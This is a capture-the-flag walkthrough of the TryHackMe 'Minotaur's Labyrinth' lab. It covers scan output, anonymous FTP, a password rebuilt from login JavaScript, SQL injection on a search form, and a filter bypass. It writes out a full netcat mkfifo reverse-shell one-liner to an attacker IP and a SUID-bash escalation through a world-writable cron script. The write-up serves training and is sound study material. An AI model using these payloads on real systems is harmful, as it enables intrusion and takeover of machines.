# TryHackMe-Minotaur's Labyrinth

## NMAP 

```bash

21/tcp   open  ftp      syn-ack ttl 63 ProFTPD                    
| ftp-anon: Anonymous FTP login allowed (FTP code 230)     
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)                           
|_http-favicon: Unknown favicon MD5: C4AF3528B196E5954B638C13DDC75F2F
| http-methods:                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                      
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login                                                       
|_Requested resource was login.html                                       
443/tcp  open  ssl/http syn-ack ttl 63 Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-favicon: Unknown favicon MD5: BE43D692E85622C2A4B2B588A8F8E2A6
| http-methods:                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                      
3306/tcp open  mysql?   syn-ack ttl 63                                    
| fingerprint-strings:                                                    
|   NULL:                                                                 
|_    Host 'ip-10-8-94-60.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server                                              
| mysql-info:                                                             
|_  MySQL Error: Host 'ip-10-8-94-60.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server                                   
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint 
```

## PORT 21 (FTP)

Since `anonymous` login is enabled , we can login to ftp without the need of password

<img src="https://i.imgur.com/DnUuRPN.png"/>

We can see a directory named `pub` and in that folder we'll see another hidden folder and a text file

<img src="https://i.imgur.com/Bq8h52F.png"/>

From `.secret` we'll get two more text files

<img src="https://i.imgur.com/7YVZPD4.png"/>

The message that those two files give us is

<img src="https://i.imgur.com/OK3bGH3.png"/>

## PORT 80 (HTTP)

On the webserver we can find a login page

<img src="https://i.imgur.com/Vx1rEhF.png"/>

If we check the source , we can fing `login.js` 

<img src="https://i.imgur.com/t38Snf4.png"/>

<img src="https://i.imgur.com/2exei9V.png"/>

Looking into the javascript file , we can see there are three arrays , `a`,`b` and `c` and the indexes of these 3 arrays are being combined to generate a password , so we need to just copy that part of the function and just print the concatenated value of string also to note that this is a password for `Daedalus`

```python
a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
print (a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
```

<img src="https://i.imgur.com/UHFWZ2c.png"/>

After submitting those credentials onto the login page we'll be granted access to the dashboard

<img src="https://i.imgur.com/Rp4Yiys.png"/>

If we scroll down a little , we can see that there are two options  , either we search for people name from `People` table or we search for creature name from `Creatures` table , so let's run `burp suite` on this page and try some sqli

If we search the name "Daedalus" it will return us this user's id and password

<img src="https://i.imgur.com/xUzT8ow.png"/>

So let's try a sqli `'or 1=1 --`

<img src="https://i.imgur.com/rpjFm68.png"/>

And this gave us all the reuslts from Person's table, we can also check how many number of columns does this table have so we can also enumerate which version of `mysql` it's using.

<img src="https://i.imgur.com/2Jb1uF9.png"/>
 
If we try to arrange the records by 4th column it's going to give us an error meaning that there are only 3 columns in the table

<img src="https://i.imgur.com/rZ5cX2z.png"/>

We can crack the users password from `crackstation` website

<img src="https://i.imgur.com/gMlQHcB.png"/>

On logging in with `M!n0taur` user we can see another tab in navigation bar 

<img src="https://i.imgur.com/57aYBJ2.png"/>

<img src="https://i.imgur.com/DXLJtIv.png"/>

## Foothold

On this page we can echo text but if we try to break out of the command to run bash commands we can't as it's using this regex (saw from the hint)

`/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/`

This regex doesn't include `|` so we can echo `id` and pipe it's reuslt to `bash`

<img src="https://i.imgur.com/HaxMYaa.png"/>

We can check if there's netcat (nc) available on this machine

<img src="https://i.imgur.com/xFemE0Z.png"/>

To get a reverse shell , we need to base64 encode the netcat shell because there will be special characters in the payload so first we'll convert it to base64 

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.94.60 2222 >/tmp/f`

<img src="https://i.imgur.com/73beC7k.png"/>

And we'll send it by piping it to base64 deocde and then to bash

<img src="https://i.imgur.com/5d2hMcu.png"/>

Stabilizing the shell

<img src="https://i.imgur.com/qwtt7Bf.png"/>

We can check the `echo.php` file just to understand what was happening in the background

<img src="https://i.imgur.com/VsGOhaJ.png"/>

Also we can find database credentials from `dbconnect.php`

<img src="https://i.imgur.com/ukF2Fg1.png"/>

In `user` directory we can get our user flag

<img src="https://i.imgur.com/E8daZU2.png"/>

## Privilege Escalation (root)

We can find a directory named `timer` in root directory `/`

<img src="https://i.imgur.com/nfHx68r.png"/>

```bash
#!/bin/bash                                                               
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
```

We know that everyone can read ,write and execute this bash script , so we can try to add `id`  and save the result in a file ,and if we wait for the bash script to be executed we'll see the result of this command

<img src="https://i.imgur.com/nOnx2Qh.png"/>

<img src="https://i.imgur.com/a8KTbdO.png"/>

Now what we can do is , make bash a `SUID` so when we execute bash it will be executed as root user and we will get shell as root user

<img src="https://i.imgur.com/uKPntQy.png"/>

<img src="https://i.imgur.com/vidty1P.png"/>

<img src="https://i.imgur.com/1AYGm4j.png"/>